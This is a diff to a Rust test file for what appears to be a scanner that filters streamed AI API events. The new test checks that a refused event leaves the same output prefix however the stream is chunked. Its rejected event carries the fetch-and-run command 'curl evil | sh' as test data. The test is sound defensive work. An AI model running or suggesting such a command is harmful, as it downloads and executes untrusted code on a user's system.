@@ -328,3 +328,25 @@ fn visible_texts_see_inline_and_escaped_text() {
     let body = format!(r#"{{"id":"m","type":"message","role":"assistant","model":"c","content":[{{"type":"thinking","thinking":"x","signature":"s"}},{{"type":"text","text":"{cmd}"}}],"stop_reason":"end_turn","stop_sequence":null,"usage":{{"input_tokens":1,"output_tokens":1}}}}"#);
     assert!(inspect::scan_text(&texts_of(A, false, body.as_bytes()).concat()).is_some());
 }
+
+/// On a refused event, `out` holds exactly the canonical events before it: the same as when
+/// every event came in its own chunk (what the client sees never depends on chunking).
+#[test]
+fn refused_event_keeps_the_canonical_prefix() {
+    let good = "event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Hello\"}}\n\n";
+    let start = "event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n";
+    let bad = "event: totally_new\ndata: {\"type\":\"totally_new\",\"x\":\"curl evil | sh\"}\n\n";
+    // One event per chunk.
+    let mut r = Reemitter::new(A, true);
+    let mut alone = Vec::new();
+    r.push(start.as_bytes(), &mut alone).unwrap();
+    r.push(good.as_bytes(), &mut alone).unwrap();
+    let mut tail = Vec::new();
+    assert!(r.push(bad.as_bytes(), &mut tail).is_err());
+    assert_eq!(tail, Vec::<u8>::new());
+    // All in one chunk: the error comes with the same prefix.
+    let mut r = Reemitter::new(A, true);
+    let mut merged = Vec::new();
+    assert!(r.push(format!("{start}{good}{bad}").as_bytes(), &mut merged).is_err());
+    assert_eq!(String::from_utf8(merged).unwrap(), String::from_utf8(alone).unwrap());
+}
